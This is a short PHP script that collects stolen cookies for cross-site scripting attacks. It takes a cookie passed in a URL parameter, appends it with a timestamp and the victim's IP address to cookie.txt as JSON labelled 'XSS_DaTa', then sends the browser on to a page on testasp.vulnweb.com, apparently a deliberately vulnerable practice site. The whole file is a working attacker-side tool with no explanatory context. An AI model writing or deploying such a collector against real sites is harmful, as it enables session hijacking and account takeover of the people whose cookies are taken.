<?php
  $cookie=$_GET['cookie'];
  $time=date("Y. m, d");
  $ip=$_SERVER['REMOTE_ADDR'];

  $file=fopen("cookie.txt", "a+");

  $a=array("time"=>$time, "ip"=>$ip, "cookie"=>$cookie);
  $b["XSS_DaTa"]=$a;
  $c=json_encode($b);
  fwrite($file, $c);
  fclose($file);
?>
<script>window.location.href="http://testasp.vulnweb.com/Templatize.asp?item=html/about.html"</script>
